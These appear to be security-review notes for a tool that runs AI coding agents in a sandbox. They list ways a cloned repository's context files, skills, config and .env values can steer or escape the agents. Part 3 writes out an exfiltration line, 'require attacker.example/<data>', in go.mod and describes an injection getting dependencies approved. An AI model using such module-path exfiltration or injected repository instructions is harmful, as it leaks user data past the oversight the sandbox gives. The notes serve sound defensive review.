### Observations for Parts 2 and 3

1. **Other `json.loads` calls without a `RecursionError` guard** read files a cloned repository controls: `state/store.py:713` (the journal), `app/status.py:85` and `state/done_record.py:33`. A deep line there crashes the command (denial of service, no other effect seen). Recommend the same guard; Part 2 or 3 should decide.
2. **`pass_env` can pass variables that undo aipm's settings**, such as `NODE_OPTIONS`, `DYLD_*`, `LD_PRELOAD` and `COPILOT_ALLOW_ALL`. It is a user-only key, so this is the user's own choice and not an attacker path; the config-home variables and `GEMINI_SANDBOX` cannot be overridden. Proposal for the owner: refuse a short list of these names in `pass_env`, as forbidden flags are refused even from user config.
3. **Residual risk candidate:** a repository's own context files, outside aipm's managed block or nested (Gemini loads nested `GEMINI.md`/`AGENTS.md` eagerly; Claude Code loads nested `CLAUDE.md` lazily), can `@`-import paths outside the worktree. That is repository content (T2), bounded by `srt`'s `denyRead` (credential paths, agent homes, the main checkout). Without `srt` it is not bounded. Part 3 should decide between a residual-risk entry and a dispatch-time check.
4. **A cloned repository's `.agents/skills/` is read by Codex as skills**, as its `AGENTS.md` is read as instructions: T2 content inside the sandbox, the same class as observation 3.
5. **Without `srt`, the self-written agent files are unwatched in a build:** Codex `rules/`, Gemini `trustedFolders.json` and `extensions/`, Copilot `permissions-config.json`. A narrower watch (hash them just around each dispatch and each gate run, and in `verify` around its own gate run, where the user's agent is not involved) would close most of it. Candidate residual risk with that recommendation.
6. **The directory hash has a 5,000-entry budget** (`git._hash_dir`); an extensions or skills folder with `node_modules` can exhaust it, so an entry past the budget does not change the hash. Recommend hashing top-level names, sizes and times when the budget runs out, or treating it as unverifiable without `srt`.
7. **A user-set `CODEX_HOME`, `GEMINI_CLI_HOME` or `COPILOT_HOME`** moves the user's real agent home away from `~`, where the watch and `denyWrite` lists look. Recommend adding that home to both lists when the variable is set in aipm's environment.
8. **`state/trust_store.py:189`** parses a repository's `.claude/settings.json` and `.mcp.json` and catches only `ValueError`: deep nesting crashes `aipm trust` with a traceback (fails closed). Same fix as RT04-1; add to observation 1's list.

### Security review

The `security-reviewer` subagent reviewed `git diff cc1a2e1..HEAD` (Part 2 only): no critical or high finding. Fixed in `ba3476e`:

- **Medium:** RT04-14's deadline did not hold. Reproduced on a loopback socket: `read(n)` on a real response returns only when its chunk is full, so a 1-byte-per-10-s answer held a lookup for days, and connecting and the headers were not bounded. A proxy in `HTTPS_PROXY` (which a repository `.env` can set through direnv or pipenv) could do this. Now bounded as described under RT04-14.
- **Low:** the check before the gates had no test, and nothing ran after them. Both are now tested, and a check after the gates was added.
- **Low:** `PlanOptions.trust` and `ReviewPrompter(offer_trust=…)` defaulted to offering trust, so RT04-8 depended on every caller passing `in_auto`. Trust is now opt-in.

### Observations for Part 3

1. **A repository's own toolchain configuration is code the trusted argv loads** (extends R-9): a cloned repository's `.cargo/config.toml` (`[target.*.runner]`, `rustc-wrapper`, `[alias]`), `rust-toolchain.toml` (`path =` names a toolchain directory) and `go.work` act on gates the user trusted by argv alone. A changed one in an attempt is a violation, but one that came with the clone, or with `git pull`, is not in the surface. Adding their hashes to the execution surface would change the trust model; Part 3 should decide between that and a residual-risk entry.
2. **E (not proved): Go and Cargo under the real `srt`.** Gates get no `GOCACHE` of their own and `PACKAGE_CACHES` has no Go or Cargo cache (`~/go/pkg/mod`, `~/Library/Caches/go-build`, `~/.cargo/registry`, `~/.cargo/git`). If Go needs a writable build cache for `go vet`, and Cargo writes its package-cache lock under `CARGO_HOME` even with `--offline`, both stacks fail under `srt`, which pushes users to turn the sandbox off. The documentation read does not settle it. Recommendation: test with the real tools (hand check below), then give gates a per-attempt `GOCACHE` and the prepare step the module and registry caches.
3. **The OTel endpoint can come from a repository `.env`** loaded by direnv or pipenv, while the user's `OTEL_EXPORTER_OTLP_HEADERS` token goes along (extends R-8). Spans carry no content, but the header does. Candidate: print the endpoint's host on every `--trace` run, or a residual-risk entry.
4. **`registries` lets the prepare step publish to npm** (`registry.npmjs.org` takes `npm publish` with a token the repository can carry): an exfiltration path for repository code in prepare (extends R-13).
5. **Trusted Go flags that change what is built**: `-modfile`, `-overlay` and `-C` are not refused. They start no other program and need a trusted argv, but `-modfile=other.mod` reads a manifest the dependency checks do not know. Recommendation: refuse `-modfile` and `-overlay` in gates and prepare (a command-policy change, so for the owner).
6. **`merge` reads the configuration twice** (`app/merge.py`): it runs only git, and the integration branch name it reads is checked, so this is not a gap; noted for consistency with RT04-7 (the reviewer agrees).
7. **Medium, existing (security review): `go mod download` exfiltrates through module paths.** It runs no repository code, but it reads the agent-written `go.mod`, and the Go proxy fetches every module path from its origin. The deps gate's own lookups send `Disable-Module-Fetch`, and `hold_prepare` stops prepare on an undeclared dependency under `allow_new_dependencies: ask|deny`. With `allow`, or with a `deps_add` an injection got approved (`auto --yes`), `require attacker.example/<data> v0.0.1` leaves before any check. Options for the owner: run the deps gate's existence check on every new Go module before prepare, or open the Go hosts only when no new module is unchecked. At least, record it in SECURITY §9.1 and ADR-0029.
8. **Low (security review): directories above aipm's cache.** Cargo, rustup and Go also read `~/Library/Caches/.cargo`, `~/.cache/rust-toolchain.toml`, a `go.mod` above the worktrees and so on, up to `/`. Without `srt` a gate could plant one there (inside R-1). Also, Go's env file under a non-default `$XDG_CONFIG_HOME/go/env` is not watched (git's is). Recommendation: hash every ancestor's `TOOLCHAIN_NAMES` entries before and after each attempt, and watch the `$XDG_CONFIG_HOME` env file as git's is.
9. **Info (security review): the owner-lookalike check is a heuristic.** It misses the same owner/repository on another host, owners three or more edits away, an extra path element, and `/v10` and later majors. G3 review and the 30-day age check remain.
10. **An abandoned registry lookup thread** (RT04-14) lives until its socket operations time out. It is a daemon, so it never holds the process open. Under a trickling proxy it can outlive the gate; it does no harm, but `HTTPS_PROXY` coming from a repository `.env` belongs in R-8's wording.
